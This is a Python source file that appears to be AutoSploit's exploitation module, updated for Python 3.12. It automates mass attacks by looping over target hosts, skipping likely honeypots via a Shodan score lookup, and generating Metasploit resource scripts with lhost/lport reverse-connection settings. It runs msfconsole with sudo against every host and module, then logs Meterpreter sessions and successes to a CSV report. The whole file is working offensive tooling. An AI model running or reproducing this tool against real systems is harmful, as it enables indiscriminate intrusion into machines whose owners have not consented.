#!/usr/bin/env python3
"""
AutoSploit Exploitation Module
Modernized for Python 3.12
"""

import os
import re
import csv
import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any

import lib.settings
import lib.output
import api_calls.honeyscore_hook


def whitelist_wash(hosts: List[str], whitelist_file: str) -> List[str]:
    """Remove IPs from hosts list that do not appear in WHITELIST_FILE."""
    try:
        with open(whitelist_file, 'r', encoding='utf-8') as f:
            whitelist_hosts = [x.strip() for x in f.readlines() if x.strip()]
        lib.output.info(f'Found {len(whitelist_hosts)} entries in whitelist.txt, scrubbing')
        washed_hosts = []
        # return supplied hosts if whitelist file is empty
        if len(whitelist_hosts) == 0:
            return hosts
        else:
            for host in hosts:
                if host.strip() in whitelist_hosts:
                    washed_hosts.append(host)

        return washed_hosts
    except IOError:
        lib.output.warning("unable to whitewash host list, does the file exist?")
        return hosts


class AutoSploitExploiter:
    """Main exploitation class for AutoSploit."""

    sorted_modules: List[str] = []

    def __init__(self, configuration: Optional[List[str]], all_modules: List[str], 
                 hosts: Optional[List[str]] = None, ruby_exec=False, msf_path=None, dryRun=False, 
                 check_honey=False, shodan_token=None, compare_honey=0.0, target_os=None, query=lib.settings.QUERY_FILE_PATH, single=None):
        self.hosts = hosts
        self.configuration = configuration
        self.mods = all_modules
        self.target_os = target_os
        self.query = query
        try:
            with open(self.query, 'r', encoding='utf-8') as f:
                self.query_file = f.read()
        except (IOError, FileNotFoundError):
            self.query_file = ""
        self.single = single
        self.ruby_exec = ruby_exec
        self.msf_path = msf_path
        self.dry_run = dryRun
        self.check_honey = check_honey
        self.shodan_token = shodan_token
        self.compare_honey = compare_honey

    def view_sorted(self) -> None:
        """View the modules that have been sorted by the relevance."""
        for mod in self.sorted_modules:
            print(mod)

    def sort_modules_by_query(self) -> List[str]:
        """Sort modules by relevance after reading the query from the temp file."""
        for mod in self.mods:
            if self.query_file.strip() in mod:
                self.sorted_modules.append(mod)
        return self.sorted_modules

    def start_exploit(self, sep: str = "*" * 10) -> None:
        """Start the exploit, there is still no rollover but it's being worked."""
        if self.target_os:
            self.mods = [m for m in self.mods if self.target_os in m]

        if self.dry_run:
            lib.settings.close("dry run was initiated, exploitation will not be done")

        today_printable = datetime.datetime.today().strftime("%Y-%m-%d_%Hh%Mm%Ss")
        current_run_path = Path(lib.settings.RC_SCRIPTS_PATH) / today_printable
        try:
            current_run_path.mkdir(parents=True, exist_ok=True)
        except OSError:
            current_run_path = Path(lib.settings.RC_SCRIPTS_PATH) / f"{today_printable}(1)"
            current_run_path.mkdir(parents=True, exist_ok=True)

        report_path = current_run_path / "report.csv"
        with open(report_path, 'w', newline='', encoding='utf-8') as f:
            csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)
            csv_file.writerow(
                [
                    'Target Host', 'Date (UTC)', 'MSF Module',
                    "LocalHost", "Listening Port", "Successful Logs",
                    "Failure Logs", "All Logs"
                ]
            )

        lib.output.info(f"Launching exploits against {len(self.hosts)} hosts:")

        win_total = 0
        fail_total = 0
        skip_amount = 0
        lib.settings.MSF_LAUNCHED = True

        for host in self.hosts:
            host = host.strip()
            if self.check_honey:
                lib.output.misc_info(f"checking if {host} is a honeypot")
                honey_score = api_calls.honeyscore_hook.HoneyHook(host, self.shodan_token).make_request()
                if honey_score < self.compare_honey:
                    lib.output.warning(
                        f"honeypot score ({honey_score}) is above (or equal to) requested, skipping target"
                    )
                    skip = True
                    skip_amount += 1
                else:
                    lib.output.misc_info(f"{host} does not appear to be a honeypot, continuing attack")
                    skip = False
            else:
                skip = False

            if not skip:
                current_host_path = current_run_path / host.strip()
                try:
                    current_host_path.mkdir(parents=True, exist_ok=True)
                except OSError:
                    pass

                for mod in self.mods:
                    if not self.dry_run:
                        lib.output.info(
                            f"launching exploit '{mod.strip()}' against host '{host.strip()}'"
                        )

                    cmd_template = (
                        "sudo {use_ruby} {msf_path} -r {rc_script_path} -q"
                    )

                    use_ruby = "ruby" if self.ruby_exec else ""
                    msf_path = self.msf_path if self.msf_path is not None else "msfconsole"

                    # What's the point of having a workspace if you overwrite it every fucking time..
                    rc_script_template = (
                        "workspace -a {workspace}\n"
                        "use {module_name}\n"
                        "setg lhost {lhost}\n"
                        "setg lport {lport}\n"
                        "setg verbose true\n"
                        "setg threads 20\n"
                        "set rhost {rhost}\n"
                        "set rhosts {rhosts}\n"
                        "run -z\n"
                        "exit -y\n"
                    )

                    module_name = mod.strip()
                    workspace = self.configuration[0]
                    lhost = self.configuration[1]
                    lport = self.configuration[2]
                    rhost = host.strip()

                    current_rc_script_path = current_host_path / mod.replace("/", '-').strip()
                    with open(current_rc_script_path, 'w', encoding='utf-8') as f:
                        f.writelines(rc_script_template.format(
                            module_name=module_name,
                            workspace=workspace,
                            lhost=lhost,
                            lport=lport,
                            rhost=rhost,
                            rhosts=rhost
                        ))

                    with open(report_path, 'a', newline='', encoding='utf-8') as f:
                        cmd = cmd_template.format(
                            use_ruby=use_ruby,
                            msf_path=msf_path,
                            rc_script_path=str(current_rc_script_path)
                        )

                        output = [""]
                        if not self.dry_run:
                            output = lib.settings.cmdline(cmd)

                        ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
                        msf_output_lines = [ansi_escape.sub('', x) for x in output if re.search(r'\[.\]', x)]

                        msf_wins = [
                            x for x in msf_output_lines if re.search(r'\[\+\]', x) or
                                                           'Meterpreter' in x or 'Session' in x or 'Sending stage' in x
                        ]
                        msf_fails = [x for x in msf_output_lines if re.search(r'\[-\]', x) and 'Background' not in x]

                        if len(msf_wins):
                            win_total += 1
                        if len(msf_fails):
                            fail_total += 1

                        csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)
                        csv_file.writerow([
                                rhost, today_printable, module_name, lhost, lport,
                                os.linesep.join(msf_wins), os.linesep.join(msf_fails), os.linesep.join(msf_output_lines)
                             ])

        print("")
        lib.output.info(f"{sep}RESULTS{sep}")

        if self.dry_run:
            lib.output.info("\tDRY RUN!")
            lib.output.info(f"\t0 exploits run against {len(self.hosts)} hosts.")
        else:
            lib.output.info(f"\t{len(self.mods)} exploits run against {len(self.hosts) - skip_amount} hosts.")
            lib.output.info(f"\t{win_total} exploit successful (Check report.csv to validate!).")
            lib.output.info(f"\t{fail_total} exploit failed.")

        lib.output.info(f"\tExploit run saved to {current_run_path}")
        lib.output.info(f"\tReport saved to {report_path}")
